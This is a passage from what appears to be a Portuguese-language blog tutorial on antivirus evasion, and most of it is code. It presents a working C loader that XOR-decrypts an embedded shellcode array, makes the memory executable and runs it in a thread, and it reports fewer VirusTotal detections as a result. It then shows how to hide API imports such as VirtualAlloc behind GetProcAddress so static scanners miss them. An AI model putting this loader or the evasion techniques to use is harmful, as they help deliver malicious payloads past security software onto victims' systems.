class="mh">0x64</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>

    <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="n">rx</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ao submeter no VirusTotal novamente, abaixamos a identificação de ameaça de <strong>19</strong> para <strong>17</strong> antivírus somente com as implementações feitas.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724102411.png" alt="" /></p><ul><li><a href="https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/detection">https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/detection</a></ul><h2 id="function-call-obfuscation"><em>Function Call Obfuscation</em></h2><p>Se formos na aba <a href="https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/details"><em>details</em></a> da análise feita pelo VirusTotal na sessão de <strong><em>Imports</em></strong>, podemos expandir a kernel32.dll e verificar as funções importadas pelo programa.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724130135.png" alt="" /></p><p>Todo módulo PE, como arquivos <code class="language-plaintext highlighter-rouge">.exe</code> e <code class="language-plaintext highlighter-rouge">.dll</code>, depende geralmente de funções externas. Dessa forma, quando um desses módulos está em execução, ele invoca funções implementadas em DLLs externas, mapeadas na memória do processo para que essas funções possam ser acessadas pelo código do processo.</p><p>Os AVs analisam os tipos de DLLs externas e as funções que os <em>malwares</em> utilizam. Isso pode ser um bom indicativo para determinar se um binário é malicioso. Portanto, os mecanismos de antivírus analisam um arquivo PE no disco verificando os endereços de importação.</p><p>É claro que esse método não é infalível e pode gerar alguns falsos positivos, mas é conhecido por funcionar em alguns casos e é amplamente utilizado pelos motores de antivírus.</p><p>É aqui que entra a ofuscação de chamadas de função. A ofuscação de chamadas de função é um método para esconder suas DLLs e funções externas que serão chamadas durante a execução. Para fazer isso, podemos usar funções padrão da API do Windows chamadas <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> e <code class="language-plaintext highlighter-rouge">GetProcAddress</code>. A primeira retorna um identificador para uma DLL especificada e a segunda permite obter o endereço de memória da função que você precisa, a qual é exportada dessa DLL.</p><p>Exemplificando o processo, podemos utilizar a própria função <code class="language-plaintext highlighter-rouge">VirtualAlloc()</code> utilizada no programa, esta função existe dentro da <code class="language-plaintext highlighter-rouge">kernel32.dll</code>. Nesse caso, podemos utilizar a função <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> para carregar o <em>handle</em> da kernel32.dll e usá-la como argumento na <code class="language-plaintext highlighter-rouge">GetProcAddress</code> chamando a <code class="language-plaintext highlighter-rouge">VirtualAlloc()</code>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
</pre></table></code></div></div><p>Neste caso, acontecerá algo diferente: ao compilar o código, o compilador não incluirá <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> na tabela de endereços de importação. Dessa forma, o motor de antivírus não conseguirá detectar isso durante a análise estática.</p><p>E mais importante: se precisássemos importar uma outra DLL externa, como <code class="language-plaintext highlighter-rouge">malware.dll</code>, utilizando a mesma técnica, nem mesmo esta DLL estaria na tabela de endereços de importação.</p><p>Se analisarmos o programa, podemos ver que todas as funções que utilizamos no código estão presentes na tabela de endereços de importação.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objdump <span class="nt">-x</span> <span class="nt">-D</span> test.exe | less
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724131132.png" alt="" /></p><p>Tomando como exemplo a função <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, podemos alterar sua chamada para que não apareça na tabela de importação. Primeiro, ao consultar o <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">MSDN</a>, vemos que sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Então podemos criar a variável global <code class="language-plaintext highlighter-rouge">pVA</code> do tipo VirtualAlloc que será um ponteiro para a VirtualAlloc original.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVA</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
</pre></table></code></div></div><p>Agora podemos capturar o endereço da VirtualAlloc original com a função <code class="language-plaintext highlighter-rouge">GetProcAddress</code> e mudar a chamada para <code class="language-plaintext highlighter-rouge">pVA</code>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>

<span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">pVA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
</pre></table></code></div></div><p>O código completo até o momento é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span 